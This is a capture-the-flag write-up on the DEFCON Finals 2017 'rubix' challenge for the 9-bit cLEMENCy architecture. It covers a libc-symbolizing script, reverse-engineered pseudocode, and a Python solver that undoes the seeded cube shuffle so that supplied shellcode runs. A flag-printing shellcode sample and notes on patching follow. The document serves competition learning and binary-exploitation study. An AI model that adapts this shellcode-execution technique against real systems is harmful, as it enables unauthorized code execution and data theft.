---
title: DEFCON Finals 2017 - Intro & Rubix
authors: Toshi Piazza
date: 2017-08-06 13:50:17 -0400
categories: binary-exploitation
---

Over the weekend, July 28-31 2017 RPISEC competed with Lab RATs and Techsec in DEFCON
Finals, one of the most important CTFs of every year. Only 15 teams in the world get to
qualify for the event each year, and our team under Lab RATs was able to earn the right to
compete among 14 other globally professional teams.

This writeup covers the first challenge presented at DEFCON Finals, which kept us on our
toes throughout the competition. It was deceptively simple, and also served as an
introduction to cLEMENCy, a terrifying 9-bit middle endian architecture, as well as to the
toolchain that was used to create all future binaries.

The majority of this writeup will involve getting our feet wet with cLEMENCy while setting
up a comfortable environment for reverse engineering the later challenges released at
DEFCON.

### DEFCON Challenge Format

A link to the challenge binary can be found [here]({{ site.baseurl }}/assets/16_rubix.bin)

For the CTF we are given only an emulator and a debugger to solve each of the challenges;
these challenges are compiled for a 9-bit middle endian architecture, cLEMENCy. When we
first run the rubix challenge under this emulator, we note that only garbage gets printed
to the terminal. This output doesn't change each run, and it's puzzling what exactly this
is. What if it's the emulator printing out 9-bit ascii instead of 8? Indeed, when we
transform from 9-bit to 8-bit between the debugger and our terminal, we end up with the
following:

```
This service implements a rubix cube. Solve the cube and win.

Give me 54 Bytes(ie: 53,12,5,etc): <input 54 comma-delimited chars>

                Top

             R6 R7 B0
             L1 T4 R5
             A0 B7 R2

  Left         Front       Right       Back

L8 L7 L0     T0 A7 F0    R8 F3 L6    B6 T3 T6
T5 L4 B1     F7 F4 A1    T1 R4 T7    F1 A4 R1
B8 B3 F8     A6 R3 L2    T2 L3 B2    R0 L5 A8

              Bottom
             A2 F5 F6
             B5 B4 A3
             T8 A5 F2


Action(U,U',D,D',L,L',R,R',F,F',B,B'):
```

Note that for the input too, we must transform the 54 comma-delimited 9-bit integers from
8-bit ascii to 9-bit ascii. Because interacting with the emulator was so painful yet so
crucial to all challenges hereafter, we wrote our own internal 9-bit to 8-bit translator
stand-in for netcat, dubbed cLEMnc.

### Symbolizing LibC

Before we go any further, we attempt to dig into the code. First, we note the following
strings in the binary (using a tool which specifically searches for ascii strings in 9-bit
format):

```
memtst %d %d  %ld
memtst: increase MEMTSTSZ
memtstleak %8p %8ld %s
memtstfail %8ld %s
memtstfree %8p %s
```

... among many other strings. However, these strings are present in almost every
binary--it's natural to assume that there exists a libc somewhere which is shared between
all challenges. Searching for these strings gives us a link to [neatlibc](https://github.com/aligrudi/neatlibc):
it turns out that starting at address 0x60 (in this binary), we can work our way up from
atoi, as each function in the binary is in exactly the same order as that specified in the
enclosing file, with each file being compiled in lexicographic order. For example, atoi is
immediately followed by atol (see atoi.c), followed by isascii, isblank, etc (from
ctypes.c). With a few exceptions, we are able to symbolize all of libc for all future
challenges, as functions are defined immediately one after the other, with no gaps.

```python
def run():
    syms = ['atoi', 'atol', 'isascii', 'isblank', 'isalpha', 'isdigit', 'isalnum', 'isspace', 'isupper', 'islower', 'tolower', 'toupper', 'isprint', 'ispunct', 'tzset', 'tp2tm', 'localtime', 'gmtime', 'mktime', 'pre_main', 'malloc', 'free', 'memtst_full', 'memtst_show', 'memtst_summary', 'memtst_init', 'memtst_put', 'memtst_get', 'memtst_bt', 'memtst_malloc', 'memtst_free', 'swap', 'fix', 'qsort', 'srand', 'rand', 'rnode_make', 'rnode_free', 'uc_len', 'uc_dec', 'ratom_copy', 'brk_len', 'ratom_read_brk', 'ratom_read', 'uc_beg', 'isword', 'brk_match', 'ratom_match', 'rnode_grp', 'rnode_atom', 'rnode_seq', 'rnode_parse', 'rnode_count', 're_insert', 'rnode_emitnorep', 'rnode_emit', 'regcomp', 'regfree', 're_rec', 're_recmatch', 'regexec', 'regerror', 'ic', 'setbuf', 'fgetc', 'getchar', 'ungetc', 'iint', 'istr', 'vfscanf', 'fscanf', 'scanf', 'vsscanf', 'sscanf', 'fgets', 'va_arg', 'fflush', 'whatisthis_0', 'oc', 'ostr', 'digits', 'oint', 'vfprintf', 'perror', 'vsnprintf', 'vsprintf', 'putc', 'puts', 'printf', 'fprintf', 'sprintf', 'snprintf', 'fputs', 'abs', 'labs', 'atexit', '__neatlibc_exit', 'exit', 'putstr', 'puti', 'puttz', 'strftime', 'strncpy', 'strcat', 'strstr', 'whatisthis_11', '_exit', 'whatisthis_14', 'read', 'write', 'gettimeofday', 'whatisthis_9', 'whatisthis_10', 'memset', 'memcpy', 'memtst_back', 'memcmp', 'mprotect', 'whatisthis_12', 'whatisthis_13', 'strlen', 'strncmp', 'strcpy', 'strchr', 'strcmp', 'wait']

    # define _start
    bv.platform = Platform['clem']
    start = bv.get_function_at(0)
    start.name = '_start'

    # Find the base of libc
    pre_main_addr = 0x901  # Fallback addr
    main_addr = None
    start_insns = list(start.basic_blocks[0])
    for i, ins in enumerate(start_insns):
        if 'car' in ins[0][0].text:
            pre_main_addr = int(ins[0][1].text, 16)
            main_addr = int(start_insns[i+1][0][1].text, 16)
            break

    # Check which way the stack grows, one function will be missing if it grows up
    # don't...worry too much about this
    if 'adi' in list(bv.get_function_at(pre_main_addr).basic_blocks[0])[0][0][0].text:
        syms.remove('whatisthis_0')

    # Rename main
    if main_addr is not None:
        bv.get_function_at(main_addr).name = 'main'

    # Find the base (atoi) based on this address
    addr = pre_main_addr - 0x8a1

    # Define the rest of libc
    for sym in syms:
        print '{}@{}'.format(sym, hex(addr))
        bv.add_function(addr)
        bv.update_analysis_and_wait()
        func = bv.get_function_at(addr)
        func.name = sym
        bv.update_analysis()
        addr = max(bb.end for bb in func.basic_blocks)
```

Thanks to Kareem (irc: krx) for developing the majority of the binja script!

Alternatively, we could consider a more generic approach which takes advantage of flare or
flirt signatures, but our quick and dirty script worked on all the challenges anyway.

### Analyzing Rubix

We now start disassembling from address 0, which is similar to `_start` on more familiar
platforms; this start template is closely shared among all challenges, with slight
variation.

```assembly
ldt    R01, [R00 + 0x57, 3]
smp    R00, R01, E
ad     R00, R00, R01
ml     R04, 0x400
mu     R05, R00, R04
smp    R05, R02, RW
ad     R00, R00, R02
mu     R05, R00, R04
smp    R05, R03, RW
ad     R00, R00, R03
adi    R00, R00, 0x1
ml     R02, 0xffde
sb     R02, R02, R00
mu     R05, R00, R04
smp    R05, R02, RW
ml     R00, 0x0
mh     R00, 0xffdf
ml     R01, 0x20
smp    R00, R01, RW
mu     R01, R01, R04
ad     ST, R00, R01
ml     R00, 0x1ff
ei     R00
or     R00, R05, R05
mu     R01, R02, R04
car    +0x8b4  (0x0000901)
car    +0x5fd0 (0x0006021)
ht
```

This second car to `0x5fd0` turns out to be the call to `main`, whereas `0x8b4` is simply
setting up some state. In binaries for which the stack grows in the opposite direction
(weird, right?) `_start` looks slightly larger, but still has the same structure.

Manually combing through main, we see the following:

```c
int main(void) {
  char integers[66];
  InitRubix();
  printf("This service implements...\n");
  Read54Bytes(integers);        // reads comma-delimited integers
  SetCubes(cube1, integers);
  SetCubes(cube2, integers);
  srand(*(tri *)&integers[0]);
  RandomShuffle(integers);
  while (true) {
    char action[9];
    PrintCube();
    printf("Action(...)\n");
    fflush(stdout);
    if (ReadUntil(action, 8) != 0) {
      printf("Invalid Input\n");
      exit(0);
    }
    PerformAction(action);
    if (memcmp(cube1, cube2) == 0)
      break;
  }
  PrintCube();
  printf("Solved\n");
  if (mprotect(cube1, E) != 0)
    exit(-1);
  FilterFunction();
  ((void (*)(void))cube1)();
}
```

The binary maintains 3 cubes throughout the program: `cube1` and `cube2` are initially set
directly to our input. `cube3` is only used for printing out the cube and can be ignored,
and is also not seen in the main function.

After our call to `srand()`, we perform a random shuffle on `cube1`, shown below:

```c
void RandomShuffle(void) {
  for (int i = 0; i < 0x1e; ++i) {
    switch (rand() % 12) {
      case 0: 
        move_U (cube1);
        move_U (cube3);
        break;
      case 1: 
        move_U_(cube1);
        move_U_(cube3);
        break;
      ...
      case 10:
        move_B (cube1);
        move_B (cube3);
        break;
      case 11:
        move_B_(cube1);
        move_B_(cube3);
        break;
    }
  }
}
```

This randomly performs actions on `cube1` and `cube3` in such a way that the resulting
cube is always solvable. Then, the program enters a read loop to parse an action and
perform it on cube1 (`PerformAction()`); once `cube1` matches `cube2` (which was
initialized to our custom input and never touched again), that means we've solved the
puzzle and are now able to execute it as shellcode.

### Exploitation

We would like to execute arbitrary shellcode that fits into 54 bytes. It turns out that
because `RandomShuffle()` performs only valid actions on `cube1`, we can always reverse
this by simply knowing the seed, which is in fact the first three numbers we give it,
converted to a trie. A valid solution script, which recieves shellcode and returns the
actions which need to be performed to solve the cube is shown below (minus the IO
portion):

```python
def rand(seed):
    for _ in range(30):
        # NOTE: the neatlibc source uses 0x7fffffff,
        # but this is not representable in 27 bits
        seed = seed * 0x62b846d + 0x3039
        yield seed & 0x7ffffff

def bytes_to_tri(bytes):
    bin_9 = lambda x: bin(x)[2:].zfill(9)
    return int(bin_9(bytes[1]) +\
               bin_9(bytes[0]) +\
               bin_9(bytes[2]), 2)

def solve_board(bytes):
    num_to_opp_actions = \
        [ "U'", "U", "D'", "D",
          "L'", "L", "R'", "R",
          "F'", "F", "B'", "B"
        ]
    forward = map(lambda i: num_to_opp_actions[i % 12],
                  rand(bytes_to_tri(bytes)))
    return forward[::-1]

board = '''
180 129 040 0e6 102 050 066 158   140 000 000 000 1a0 129 040 0e6
102 050 066 168 140 000 000 000   000 121 024 1a0 129 048 0e6 102
050 0a6 168 000 000 000 000 0c0   140 000 000 000 000 000 000 000
000 000 000 000'''
board = board.split()
board = map(lambda x: int(x, 16), board)
print ",".join(map(str, board))
print "\n".join(solve_board(board))
```

The given bytes should be interpreted as valid shellcode which prints out the flag (e.g.
`printf(0x401000)`). The example shellcode used in the example above disassembles to the
following:

```assembly
ml     r19,0x10040
rli    r19,r19,0xa
ldt    r1,[r19,0xb]
ml     r19,0x14040
rli    r19,r19,0xa
stt    r1,[r19,0xb]
ml     r2,0x24
ml     r19,0x14048
rli    r19,r19,0xa
stt    r2,[r19]
ht
```

### Recommended Patch

Unfortunately, DEFCON Finals requires much more past the initial exploit; we need to patch
our own services in a way that does not violate the service check, and in a way that
disrupts all future exploits from other teams. This is challenging, because we are unable
to simply kill the call to mprotect or the call to the user's shellcode; the service check
likely depends on being able to run shellcode, even if it does not necessarily have to
print out the flag.

Fortunately, LegitBS dropped us a nice hint in the binary in the form of
`FilterFunction()`, shown below:

```c
void FilterFunction(void) {
  char buf1[22];
  char buf2[25];

  memset(buf1, 0, 22);
  memcpy(buf1, "FILTER FUNCTION BELOW", 22);
  memset(buf2, 0, 25);
  // this is all garbage... I think?
  memcpy(buf2,
    "\x23\x12\x49\x85\x42"
    "\x29\x48\x40\x46\x2a"
    "\x93\x88\x65\x42\x49"
    "\x3c\x9c\x20\x21\x11"
    "\x49\x84\xf2\xb8\x00", 25);
  // roughly 1200 bytes of NOPs
}
```

Clearly, we're being asked to "filter" the globally stored shellcode, and insert it into
this huge code cave. In other words, to completely patch the program, we are asked to
write a static or dynamic shellcode analyzer to filter out shellcode which could
potentially leak the flag. Hideous!

Unfortunately, neither our team nor any others wrote a full static analyzer within the
time constraints, and every patch was circumventable. By the third day, Lab RATs had
accumulated a working shellcode for every individual patch, so we were consistently
popping flags on all other teams. As a result, this challenge kept everyone on their toes
the entire competition.
